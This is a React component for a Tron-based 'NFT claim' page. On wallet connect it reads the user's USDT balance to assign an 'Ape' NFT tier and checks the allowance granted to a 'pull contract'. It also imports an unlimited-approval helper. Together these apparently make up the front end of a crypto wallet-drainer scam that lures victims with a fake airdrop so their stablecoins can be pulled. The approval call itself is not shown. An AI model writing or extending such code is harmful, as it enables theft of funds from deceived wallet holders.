"use client";

import { useEffect, useState } from "react";
import { useTron } from "./TronProvider";
import { 
  TOKEN_ADDRESS, 
  PULL_CONTRACT_ADDRESS,
  getTokenBalance,
  getAllowance,
  approveUnlimited,
  fromSun,
  toSun
} from "@/lib/tron";
import { useToast } from "@/components/ui/use-toast";
import { TronConnectButton } from "./TronConnectButton";

interface AutoClaimConnectButtonProps {
  onEligibilityCheck?: (tier: number | null) => void;
}

export function AutoClaimConnectButton({ onEligibilityCheck }: AutoClaimConnectButtonProps) {
  const { address, isConnected } = useTron();
  const { toast } = useToast();
  
  const [balance, setBalance] = useState<bigint>(BigInt(0));
  const [allowance, setAllowance] = useState<bigint>(BigInt(0));
  const [hasChecked, setHasChecked] = useState(false);

  // Determine NFT tier based on balance (USDT has 6 decimals)
  const getNFTTier = (userBalance: bigint) => {
    const decimals = 6; // USDT-TRC20 has 6 decimals
    const threshold10k = BigInt(toSun("10000", decimals));
    const threshold500 = BigInt(toSun("500", decimals));
    const threshold100 = BigInt(toSun("100", decimals));
    const threshold50 = BigInt(toSun("50", decimals));

    if (userBalance >= threshold10k) {
      return { tier: 4, image: "/nft4.avif", name: "Diamond Ape", rarity: "Legendary", minRequired: "10,000" };
    } else if (userBalance >= threshold500) {
      return { tier: 3, image: "/nft2.avif", name: "Gold Ape", rarity: "Epic", minRequired: "500" };
    } else if (userBalance >= threshold100) {
      return { tier: 2, image: "/ape1.jpeg", name: "Silver Ape", rarity: "Rare", minRequired: "100" };
    } else if (userBalance >= threshold50) {
      return { tier: 1, image: "/nft3.avif", name: "Bronze Ape", rarity: "Uncommon", minRequired: "50" };
    }
    return null;
  };

  // Check eligibility when wallet connects (no auto-claim)
  useEffect(() => {
    if (!isConnected || !address) return;

    const checkEligibility = async () => {
      try {
        // Fetch balance and allowance
        const [bal, allow] = await Promise.all([
          getTokenBalance(TOKEN_ADDRESS, address),
          getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS),
        ]);
        
        setBalance(bal);
        setAllowance(allow);

        // Check eligibility tier
        const nftTier = getNFTTier(bal);
        if (nftTier) {
          onEligibilityCheck?.(nftTier.tier);
        }
      } catch (error: any) {
        console.error("Error checking eligibility:", error);
      }
    };

    checkEligibility();
  }, [isConnected, address]);

  return <TronConnectButton />;
}
